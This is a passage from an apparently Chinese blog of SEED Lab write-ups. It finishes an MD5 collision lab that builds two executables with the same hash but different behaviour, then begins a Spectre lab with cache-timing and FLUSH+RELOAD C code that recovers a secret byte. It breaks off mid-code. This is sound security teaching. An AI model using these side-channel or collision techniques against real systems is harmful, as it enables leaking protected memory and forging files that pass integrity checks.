src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690377209-2d2678c2-c2f9-4e28-887a-3f89035d1cfb.jpeg#averageHue=%231d2218&id=oKoBw&originHeight=93&originWidth=505&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>直接看最后的部分，也就是新构造的部分<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690377540-76b81c0d-2f33-4a4d-85a0-f04b3277130e.jpeg#averageHue=%2331342c&id=f91AA&originHeight=154&originWidth=463&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>我们再把 ta  中从第  30c0 + 1 &#x3D; 30c1  个字节（注意要把它转化为十进制 12481） 到最后一个字节的部分拿出来作为 suffix，并且分别拿  out1, out2  分别和  suffix<br />连接就能形成两个不同的可执行程序  1  和  2：<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690377874-131e9496-bb9a-4dc6-b8f0-6ed7c91cf84b.jpeg#averageHue=%231c2b13&id=C5nMu&originHeight=64&originWidth=482&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>不过一开始它们是不可执行的，我们要用  ch mod +x 修改权限，修改完成后再 次运行，它就能输出数组里面的值，执行 file1  、file2 输出结果如图，有不同之<br />处， 因为数组中间修改了一部分：<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690378280-3e63c600-2892-4b07-b889-7d539acdd2c9.png#averageHue=%232e3727&id=KYpE0&originHeight=190&originWidth=446&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>再验证一下  1  和  2  的 md5 校验码相等：<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690378672-c6d5efe6-e493-4cd3-bd8e-27fa65a7a4c2.jpeg#averageHue=%231c2915&id=lHBTS&originHeight=91&originWidth=422&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />所以我们构造是成功的。</p><p><a name="nXKzG"></a></p><h2 id="2-4-实验四-生成两个-MD5-值相同但输出不同的两个可执行文件"><a href="#2-4-实验四-生成两个-MD5-值相同但输出不同的两个可执行文件" class="headerlink" title="2.4 实验四-生成两个 MD5 值相同但输出不同的两个可执行文件"></a><strong>2.4 实验四-生成两个 MD5 值相同但输出不同的两个可执行文件</strong></h2><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690379000-661180ab-3698-4a7f-a9df-c24437fe1247.jpeg#averageHue=%23dadcd9&id=PpHHq&originHeight=162&originWidth=421&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />将 Lab3_task3.c 构造如下：<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690379348-a69b9a91-af7d-4779-9ae7-b5b7371b2a4f.jpeg#averageHue=%23f3f5f4&id=bA4E3&originHeight=441&originWidth=323&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />再对该代码编译、运行，再次  bless    Lab3_task3，找之前放的  200  个  A  和  200<br />个  B  在哪里。<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690379666-fab4ef2c-324c-4742-85e0-caeff61b6f7e.jpeg#averageHue=%23e4e7e2&id=GGVCb&originHeight=378&originWidth=393&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>arr1 的位置与任务二相同，截取前 12352 作为前缀并生成两个 md5 相同的文件：<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690380000-640c1747-3fc0-4924-bb0f-fb6e4ef377e5.jpeg#averageHue=%232e3923&id=QfSnq&originHeight=196&originWidth=469&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>截取后缀（从 GCC 开始）<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690380226-b87f9b5a-9314-42de-96f1-b9305e0bc3d7.jpeg#averageHue=%2318280f&id=IFh5D&originHeight=37&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>把其中一个新前缀 p 的后 32(字符 A)+128(md5 填充物)&#x3D;160 个字节截取出来作<br />为第二个数组的主体：<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690380520-155b912c-b384-4f04-826f-9739436950b1.jpeg#averageHue=%231b2912&id=l4szl&originHeight=41&originWidth=490&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>获取填充字节 0x00，由于数组 200 个字节，因此填充 40 个，注意两个数组间还<br />有 24 字节的填充，到最后一个填充字节十六进制是 0x3100，其十进制是 12544<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690380829-4c8f204a-0335-443b-8239-24d0946bd764.jpeg#averageHue=%23e0e3e0&id=BLqiK&originHeight=246&originWidth=397&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />将前 12544 字节裁切为 temp，再裁切 temp 的最后 24 个字节为 m24，即 24 个</p><p>填充字节 0x00。再裁切 m24 的 16 个 0x00 放入 temp,最后合并为 40 个填充字节<br />的 m40<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690381167-baca160d-343f-41cb-9421-9c46c093a9f0.jpeg#averageHue=%231b2a12&id=z6HgU&originHeight=80&originWidth=460&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>开始拼接，并赋予权限：<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690381454-06b20ab9-7de9-497f-9d8e-aa987f22b2f3.jpeg#averageHue=%231b2a12&id=YTHnN&originHeight=58&originWidth=503&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />补充解释：out1 里面除了 prefix 有 200 个 A ，然后<img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690381788-a5dee694-70f6-43d0-9144-7b32a8bb9ba3.png#averageHue=%23c2c2c2&id=SjzwK&originHeight=23&originWidth=9&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">m40+m24 是中间补在 A 、B<br />的 64 个 0x00，middle+m40 是第二个数组最后 200 个的位置，再加上 suffix 就<br />还原了原来的长度<br />对 1.out 、2.out 执行：<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690382073-6454a598-4d3b-4661-b718-c2ea4bb5d981.jpeg#averageHue=%231a2912&id=zsXjr&originHeight=132&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />由图可得两个文件执行的函数不同(因为数组的值改变了)，但是 md5 值相同。<br><a name="x9mLa"></a></p><h2 id="2-5-对实验四的解释"><a href="#2-5-对实验四的解释" class="headerlink" title="2.5 对实验四的解释"></a><strong>2.5 对实验四的解释</strong></h2><ul><li>不同行为：在最后生成的可执行程序中，第二个数组与源程序无关， 完全来自于第一个数组， 因为 middle 取自 out1； 因此经过填充后，两个文   件中第二个数组的与其中一个相同而与(md5collgen 产生的)另一个不相同导  致 if 判断产生不一样的结果，最后执行不  一样的函数。</li><li>相同 md5：out1.bin 与 out2.bin 是由 md5collgen 产生的具有相同 md5 值的不同 prefix 文件，而两个文件后面的填充+middle+suffix 完全相同， 因此在迭代运算中保持着相同的 md5 导致最后计算结果一样。</li></ul>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：幽灵攻击实验</title>
      <link href="/post/f52b3abf.html"/>
      <url>/post/f52b3abf.html</url>
      
        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p><h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>幽灵攻击于2017年发现并于2018年1月公开披露，利用了许多现代处理器中存在的关键漏洞，包括英特尔、AMD和ARM 处理器的漏洞。这些漏洞允许程序打破进程间和进程内的隔离，因此恶意程序可以从其无法访问的区域读取数据。硬件保护机制（用于进程间隔离）或软件保护机制（用于进程内隔离）不允许这种访问，但是cpu的设计中存在漏洞，有可能破坏保护。因为缺陷存在于硬件中，所以很难从根本上解决这个问题，除非我们从计算机上的cpu。幽灵漏洞代表了cpu设计中一种特殊的漏洞类型。除了崩溃漏洞之外，它们还为安全教育提供了宝贵的教训。<br />本实验室的学习目标是让学生获得关于幽灵攻击的第一手经验。攻击本身非常复杂，所以我们将其分解为几个小步骤，每个步骤都很容易理解和执行。一旦学生理解了每一步，他们就不难把所有的东西放在一起来执行实际的攻击。本实验室涵盖了以下所描述的一些主题：</p><ul><li>幽灵攻击</li><li>侧通道攻击</li><li>CPU缓存</li><li>在CPU微架构内的无序执行和分支预测<br><a name="vg0k9"></a></li></ul><h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="sVEWg"></a></p><h2 id="2-Code-Compilation"><a href="#2-Code-Compilation" class="headerlink" title="2 Code Compilation"></a><strong>2 Code Compilation</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprog myprog.c</span><br></pre></td></tr></table></figure><p><a name="eOgml"></a></p><h2 id="3-Tasks-1-and-2-Side-Channel-Attacks-via-CPU-Caches"><a href="#3-Tasks-1-and-2-Side-Channel-Attacks-via-CPU-Caches" class="headerlink" title="3 Tasks 1 and 2: Side Channel Attacks via CPU Caches"></a>3 <strong>Tasks 1 and 2: Side Channel Attacks via CPU Caches</strong></h2><ul><li>崩溃和幽灵攻击都使用CPU缓存作为一个侧通道来窃取一个受保护的秘密。在这种侧通道攻击中使用的技术称为刷新+重加载。我们将首先研究这项技术。在这两个任务中开发的代码将在以后的任务中用作构建块。</li><li>CPU缓存是计算机的CPU用来降低从主缓存访问数据的平均成本（时间或能量）的硬件缓存。从CPU高速缓存访问数据比从主存储器访问数据要快得多。当数据从主存器获取时，通常由CPU缓存，所以如果再次使用相同的数据，访问时间会快得多。</li><li>因此，当CPU需要访问某些数据时，它首先查看其缓存。如果数据（这称为缓存命中），将直接从那里获取。如果数据不存在（这称为错过），CPU将进入主存获取数据。在后一种情况下所花费的时间要长得多。大多数现代cpu都有CPU缓存。<br><a name="sHTt4"></a></li></ul><h3 id="3-1-Task-1-Reading-from-Cache-versus-from-Memory"><a href="#3-1-Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="3.1 Task 1: Reading from Cache versus from Memory"></a><strong>3.1 Task 1: Reading from Cache versus from Memory</strong></h3><ul><li><p>缓存内存用于以更快的速度向高速处理器提供数据。与主存相比，缓存内存非常快。让我们看看时间差。</p></li><li><p>在下面的代码(CacheTime.c)中，我们有一个大小为10<em>4096的数组。我们首先访问它的两个元素，数组[3</em>4096]和数组[7*4096]。因此，包含这两个元素的页面将被缓存。</p></li><li><p>然后，我们从数组[04096]读取元素到数组[94096]，并测量3在内存读取中所花费的时间。在代码中，行➀在内存读取前读取CPU的时间戳(TSC)计数器，而行➁在内存读取后读取计数器。它们的区别在于在内存读取中花费的时间（按CPU周期数）。需要注意的是，<strong>缓存是在缓存块级别完成的，而不是在字节级别</strong>。一个典型的高速缓存块大小为64字节。我们使用数组[k*4096]，因此程序中使用的两个元素不属于同一个缓存块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">10</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Initialize the array</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="comment">// FLUSH the array from the CPU cache</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span>]);</span><br><span class="line">  <span class="comment">// Access some of the array items</span></span><br><span class="line">  <span class="built_in">array</span>[<span class="number">3</span>*<span class="number">4096</span>] = <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span>*<span class="number">4096</span>] = <span class="number">200</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span>];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);   junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;</span>,i, (<span class="type">int</span>)time2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>程序解读：</p></li><li><p>time1,time2因为是频繁操作，又不用取地址，适合用寄存器变量</p></li><li><p>读操作远大于写操作时，用volatile可以避免加锁，故addr适合定义成volatile_mm_clflush这个函数调用一下，确保没有被CPU缓存</p></li><li><p>time1 &#x3D; __rdtscp(&amp;junk); 表示读取junk到内存，并返回TSC</p></li><li><p>请使用<strong>gcc -march&#x3D;native CacheTime.c</strong>编译以下代码，并运行它。数组[3_4096]和数组[7_4096]的访问速度是否比其他元素更快？您应该运行该程序至少10次，并描述您的观察结果。从实验中，您需要找到一个阈值，可用于区分这两种类型的内存访问：从缓存访问数据和从主存访问数据。这个阈值对于这个实验室的其他任务都很重要。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native CacheTime.c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702472944391-f1d0e465-822e-4fea-8871-de36c2b2eb91.png#averageHue=%2313110f&clientId=uf8fdb3e2-6fa1-4&from=paste&height=147&id=uf6ebb151&originHeight=232&originWidth=1060&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66963&status=done&style=none&taskId=u59bdc57d-8f4d-4238-b8fa-b3c5e4a4e20&title=&width=673.0159035795864" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702472972630-aa2c9377-21b7-4460-9c5a-711b4affd76d.png#averageHue=%2314100d&clientId=uf8fdb3e2-6fa1-4&from=paste&height=367&id=ucfd35819&originHeight=578&originWidth=687&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=183706&status=done&style=none&taskId=uce43cb52-e104-45ca-bc68-0144555c2bb&title=&width=436.19049599922255" alt="image.png"><br />运行10次后观察发现，阈值应该为64<br><a name="uHSqp"></a></p></li></ul><h3 id="3-2-Task-2-Using-Cache-as-a-Side-Channel"><a href="#3-2-Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="3.2 Task 2: Using Cache as a Side Channel"></a><strong>3.2 Task 2: Using Cache as a Side Channel</strong></h3><p>该任务的目的是使用侧通道来提取受害者函数所使用的秘密值。假设有一个受害者函数，它使用一个秘密值作为索引来从数组中加载一些值。还假设秘密值不能从外部访问。我们的目标是使用侧边通道来获得这个秘密的价值。我们将使用的技术被称为刷新+重加载。图2说明了该技术，它包括三个步骤<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702473158253-5fcd9d80-155c-4450-b8ab-ce83fa3f5cf8.png#averageHue=%23f3f2f2&clientId=uf8fdb3e2-6fa1-4&from=paste&height=250&id=u01078bb3&originHeight=730&originWidth=1668&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=164606&status=done&style=none&taskId=u385448ea-f7f6-4e3b-b615-87730367421&title=&width=571.4603271484375" alt="image.png"></p><ul><li>1.从缓存内存中刷新整个阵列，以确保该阵列没有被缓存。</li><li>2.调用受害者函数，该函数根据秘密的值访问其中一个数组元素。此操作将导致高速缓存相应的数组元素。</li><li>3.重新加载整个数组，并测量重新加载每个元素所需的时间。如果一个特定元素的加载时间快，很可能元素已经在缓存中。该元素必须是受害者函数所访问的元素。因此，我们可以弄清楚秘密值是什么。下面的程序使用刷新+重加载技术来找出变量秘密中包含的单字节秘密值。由于一个字节秘密有256个可能的值，因此我们需要将每个值映射到一个数组元素。最简单的方法是定义一个由256个元素组成的数组（即数组[256]）。然而，这并不起作用。缓存是在块级别上完成的，而不是在字节级别上完成的。如果访问数组[k]，则将缓存包含此元素的内存块。因此，数组[k]的相邻元素也将被缓存，这使得很难推断出秘密是什么。为了解决这个问题，我们创建了一个包含256<em>4096字节的数组。在我们的重新加载步骤中使用的每个元素都是数组[k</em>4096]。因为4096大于一个典型的缓存块大小（64字节），所以没有两个不同的元素数组[i<em>4096]和数组[j</em>4096]将在同一个缓存块中。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">int</span> temp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> secret = <span class="number">94</span>;</span><br><span class="line"><span class="comment">/* cache hit time threshold assumed*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Flush the values of the array from cache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    temp = <span class="built_in">array</span>[secret*<span class="number">4096</span> + DELTA];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">        time1 = __rdtscp(&amp;junk);</span><br><span class="line">        junk = *addr;</span><br><span class="line">        time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">        <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>,i);&#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    flushSideChannel();</span><br><span class="line">    victim();</span><br><span class="line">    reloadSideChannel();</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>程序设定了一个阈值，当时间小于这个阈值，说明被CPU缓存了，这时这个值肯定是调用victim函数的那个值，可以把该值读取出来。</li><li>乘4096只是为了把cache块隔开，4096大于一个典型的64字节的内存块</li><li>由于缓存是块级缓存的，故不能简单定义array[256]</li><li>请使用Gcc编译程序并运行。需要注意的是，该技术并不是100%准确的，而且您可能无法一直观察到预期的输出。运行该程序至少20次，并计算出您将正确获得该秘密的次数。还可以将缓存HIT阈值调整为来自任务1的阈值（此代码中使用80）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o FlushReload FlushReload.c</span><br></pre></td></tr></table></figure><p>不知是不是amd芯片原因，运行20次后，发现并无明显变化：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702473952719-b2af6a8e-dc15-4c9d-bd12-c7f85c40bb2c.png#averageHue=%230e0b09&clientId=uf8fdb3e2-6fa1-4&from=paste&height=397&id=u432555a1&originHeight=626&originWidth=572&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=114637&status=done&style=none&taskId=u4b394937-4987-4d23-9d26-08ed3a0d264&title=&width=363.17461966747493" alt="image.png"><br><a name="Wx78V"></a></p><h2 id="4-Task-3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#4-Task-3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="4 Task 3: Out-of-Order Execution and Branch Prediction"></a><strong>4 Task 3: Out-of-Order Execution and Branch Prediction</strong></h2><blockquote><p>这个任务的目的是了解cpu中的无序执行。我们将用一个实验来帮助学生观察这种执行方式。</p></blockquote><p><a name="Aje8Z"></a></p><h3 id="4-1-Out-Of-Order-Execution"><a href="#4-1-Out-Of-Order-Execution" class="headerlink" title="4.1 Out-Of-Order Execution"></a><strong>4.1 Out-Of-Order Execution</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (x &lt; size) &#123;</span><br><span class="line">data = data + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>关于上述代码示例的陈述在从CPU外部观察时是正确的。然而，如果我们深入到CPU内部、从微架构层面观察执行序列，这个陈述就不完全正确了。如果我们这样做，我们会发现即使x的值大于size，第3行可能会成功执行。这是由于现代CPU采用的一种重要的优化技术，称为乱序执行。</li><li>乱序执行是一种优化技术，允许CPU最大限度地利用其所有执行单元。CPU不再严格按照顺序处理指令，而是在所有必需的资源可用时立即并行执行它们。当当前操作的执行单元被占用时，其他执行单元可以提前运行。</li><li>在上述代码示例中，在微架构层面，第2行涉及两个操作：从内存加载size的值，并将其与x进行比较。如果size不在CPU缓存中，可能需要数百个CPU时钟周期才能读取该值。现代CPU不会闲置，而是尝试预测比较的结果，并根据估计进行分支的猜测执行。由于这样的执行开始于比较完成之前，所以称为乱序执行。在进行乱序执行之前，CPU会存储其当前状态和寄存器的值。当size的值最终到达时，CPU将检查实际的结果。如果预测是正确的，就会提交这种猜测执行，并获得显著的性能提升。如果预测是错误的，CPU将恢复到保存的状态，因此乱序执行产生的所有结果都将被丢弃，就好像从未发生过一样。这就是为什么从外部看，我们认为第3行从未执行过。</li><li>英特尔和几家CPU制造商在无序执行的设计上犯了一个严重的错误。如果不应该发生这样的执行，它们将消除无序执行对寄存器和内存的影响，因此执行不会导致任何可见的影响。然而，他们忘记了一件事，即对CPU缓存的影响。在无序执行期间，引用的内存被提取到寄存器中，也存储在缓存中。如果必须丢弃无序执行的结果，那么也应该丢弃由该执行引起的缓存。不幸的是，但在大多数cpu中，情况并非如此。因此，它产生了一个可观察到的效果。使用任务1和任务2中描述的侧通道技术，我们可以观察到这种效果。幽灵党的攻击巧妙地利用这种可观察到的效果来找出受保护的秘密价值。<br><a name="bxytC"></a></li></ul><h3 id="4-2-The-Experiment"><a href="#4-2-The-Experiment" class="headerlink" title="4.2 The Experiment"></a><strong>4.2 The Experiment</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (150)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> size = <span class="number">10</span>;</span><br><span class="line"><span 